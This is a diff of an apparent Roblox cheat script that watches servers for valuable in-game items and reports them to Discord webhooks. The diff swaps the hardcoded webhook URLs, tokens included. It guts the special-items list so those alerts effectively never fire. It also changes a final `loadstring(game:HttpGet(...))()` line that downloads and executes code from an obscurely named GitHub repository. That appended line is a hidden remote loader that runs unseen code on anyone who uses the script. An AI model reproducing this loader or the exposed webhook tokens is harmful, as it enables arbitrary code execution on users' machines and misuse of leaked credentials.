@@ -1,3 +1,4 @@
+
 local Players = game:GetService('Players')
 local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
@@ -84,7 +85,7 @@ local WEBHOOKS = {
         showJoinerAd = true
     },
     { -- Special brainrots + overpay + mutations
-        url = 'https://discord.com/api/webhooks/1457015322119897133/kQkqA4AMYLVviEYFT7Rf4Udz6ATSRYPVcPeDtALzHFfveew7jmjGCPE6Q-5KAZViCaIE',
+        url = 'https://discord.com/api/webhooks/1456411967941120194/5BhYfK-zbqoe_tG7SxHBXysz0IIJj1V4pPXh7LjnZz62vXTv5Z2AWDGT-CGii1xKjTEv',
         title = '⭐️ SPECIAL BRAINROTS + MUTATIONS',
         color = 0xff00ff,
         special = true,
@@ -95,59 +96,7 @@ local WEBHOOKS = {
 
 -- 📋 SPECIAL BRAINROTS WITH MIN VALUES + MUTATIONS
 local SPECIAL_BRAINROTS = {
-    ['Garama and Madundung'] = { min = 0, mutations = {} },
-    ['Dragon Cannelloni'] = { min = 0, mutations = {} },
-    ['La Supreme Combinasion'] = { min = 0, mutations = {} },
-    ['Ketupat Kepat'] = { min = 400_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Strawberry Elephant'] = { min = 0, mutations = {} },
-    ['Ketchuru and Musturu'] = { min = 270_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Tralaledon'] = { min = 100_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Tictac Sahur'] = { min = 300_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Burguro And Fryuro'] = { min = 0, mutations = {} },
-    ['La Secret Combinasion'] = { min = 250_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Spooky and Pumpky'] = { min = 0, mutations = {} },
-    ['Meowl'] = { min = 0, mutations = {} },
-    ['La Casa Boo'] = { min = 0, mutations = {} },
-    ['Headless Horseman'] = { min = 0, mutations = {} },
-    ['Los Tacoritas'] = { min = 100_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Capitano Moby'] = { min = 0, mutations = {} },
-    ['Cooki and Milki'] = { min = 0, mutations = {"Shiny"} },
-    ['Fragrama and Chocrama'] = { min = 0, mutations = {} },
-    ['Guest 666'] = { min = 50_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Fishino Clownino'] = { min = 0, mutations = {} },
-    ['Tacorita Bicicleta'] = { min = 250_000_000, mutations = {"Cursed", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow"} },
-    ['La Jolly Grande'] = { min = 350_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Rainbow"} },
-    ['W or L'] = { min = 400_000_000, mutations = {"Cursed", "Candy", "Lava", "Yin Yang", "Rainbow", "Galaxy"} },
-    ['Los Puggies'] = { min = 400_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Rainbow", "Galaxy"} },
-    ['La Taco Combinasion'] = { min = 450_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Chipso and Queso'] = { min = 260_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Mieteteira Bicicleteira'] = { min = 500_000_000, mutations = {} },
-    ['Los Mobilis'] = { min = 500_000_000, mutations = {} },
-    ['La Spooky Grande'] = { min = 500_000_000, mutations = {"Cursed", "Bloodrot", "Lava", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Eviledon'] = { min = 500_000_000, mutations = {"Cursed", "Bloodrot", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Chillin Chili'] = { min = 500_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Money Money Puggy'] = { min = 350_000_000, mutations = {"Bloodrot"} },
-    ['Tang Tang Keletang'] = { min = 350_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Los Primos'] = { min = 250_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Orcaledon'] = { min = 400_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Las Sis'] = { min = 300_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Radioactive"} },
-    ['La Extinct Grande'] = { min = 250_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow"} },
-    ['Los Bros'] = { min = 250_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Spaghetti Tualetti'] = { min = 700_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Rainbow", "Galaxy"} },
-    ['Esok Sekolah'] = { min = 500_000_000, mutations = {} },
-    ['Nuclearo Dinossauro'] = { min = 250_000_000, mutations = {"Cursed", "Bloodrot"} },
-    ['Lavadorito Spinito'] = { min = 300_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['La Ginger Sekolah'] = { min = 500_000_000, mutations = {"Cursed", "Candy", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Reinito Sleighito'] = { min = 0, mutations = {} },
-    ['Dragon Gingerini'] = { min = 0, mutations = {} },
-    ['Festive 67'] = { min = 0, mutations = {} },
-    ['Ginger Gerat'] = { min = 0, mutations = {} },
-    ['Jolly Jolly Sahur'] = { min = 250_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Skibidi Toilet'] = { min = 0, mutations = {} },
-    ['Tuff Toucan'] = { min = 500_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
-    ['Cerberus'] = { min = 0, mutations = {} },
-    ['Ay Mi Gatito'] = { min = 0, mutations = {} },
-    ['AY MI GATITO MIAU MIAU'] = { min = 0, mutations = {} },
+    ['Garama and Madundung'] = { min = 999999999999999, mutations = {} },
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -293,7 +242,6 @@ local OBJECTS = {
     ['Giftini Spyderini'] = { emoji = '🕷', important = true },
     ['Cerberus'] = { emoji = '👹', important = true },
     ['Ay Mi Gatito'] = { emoji = '😻', important = true },
-    ['AY MI GATITO MIAU MIAU'] = { emoji = '😻', important = true },
 }
 
 local ALWAYS_IMPORTANT = {}
@@ -898,4 +846,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/g5hg45yhhop.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/fvddfv"))()
